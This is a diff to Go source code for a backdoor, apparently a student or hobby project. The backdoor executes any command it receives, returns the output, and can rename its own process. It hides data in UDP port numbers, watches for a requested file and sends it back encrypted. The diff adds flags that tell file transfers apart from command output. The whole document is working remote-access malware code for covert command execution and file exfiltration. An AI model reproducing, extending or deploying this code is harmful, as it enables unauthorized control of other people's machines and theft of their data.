@@ -47,6 +47,9 @@ const MAX_PORT uint16 = 45535
 const CLIENT = 1
 const SERVER = 0
 const SND_CMPLETE uint16 = 3414
+const FSND_CMPLETE uint16 = 3415
+const FTRANSFER  = 1
+const CMD = 0
 const helpStr = "Client Usage Help\n" +"=================================\n" +
 "EXEC Commands\nSending any command will result in it being executed by the backdoor at the other end.\n" +
 "Once the command is sent, you will recieve the output back from the backdoor.\n============\nBD Commands\n" + "These commands are prefixed by a ! and are executed on the backdoors own program options\n!setprocess [name]\n" + "==================================\n"
@@ -177,15 +180,8 @@ func beginListen(ip string, port, lport uint16) {
 			}
 		} else {
 			if incomingIP == authenticatedAddr && uint16(udpLayer.DstPort) == lport {
-				
 				err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
 				checkError(err)
-				
-				if(uint16(udpLayer.DstPort) == SND_CMPLETE){
-
-				
-				}
-
 			} else if incomingIP == authenticatedAddr && uint16(udpLayer.DstPort) == SND_CMPLETE {
 				strData := buffer.String()
 				if strings.HasPrefix(strData, "[EXEC]") {
@@ -243,12 +239,12 @@ func executeServerCommand(data, ip string, port uint16) {
 		break;
 		
 	case "monitor":
-		sendEncryptedData(port, "Monitoring for requested file\n", ip);
+		sendEncryptedData(port, "Monitoring for requested file\n", ip, CMD);
 		go monitorFile(ip, args[1], port + 1);
 		break;
 
 	case "exit" :
-		sendEncryptedData(port, "Server exiting...\n", ip);
+		sendEncryptedData(port, "Server exiting...\n", ip, CMD);
 		os.Exit(0);
 		break;
 
@@ -258,7 +254,7 @@ func executeServerCommand(data, ip string, port uint16) {
 
 	fmt.Printf("%s", out);
 
-	sendEncryptedData(port, out, ip);	
+	sendEncryptedData(port, out, ip, CMD);	
 }
 
 func monitorFile(ip, filename string, port uint16){
@@ -273,7 +269,7 @@ func monitorFile(ip, filename string, port uint16){
 
 			data := encrypt_data(string(file))
 			
-			sendEncryptedData(port, string(data), ip)
+			sendEncryptedData(port, string(data), ip, FTRANSFER)
 			return
 		}
 	}
@@ -303,5 +299,5 @@ func executeCommand(cmd, ip string, port uint16){
 	out, _ := exec.Command(args[0], args[1:]...).CombinedOutput();
 	fmt.Printf("OUT:\n%s", out);
 
-	sendEncryptedData(port, string(out[:]), ip);
+	sendEncryptedData(port, string(out[:]), ip, CMD);
 }
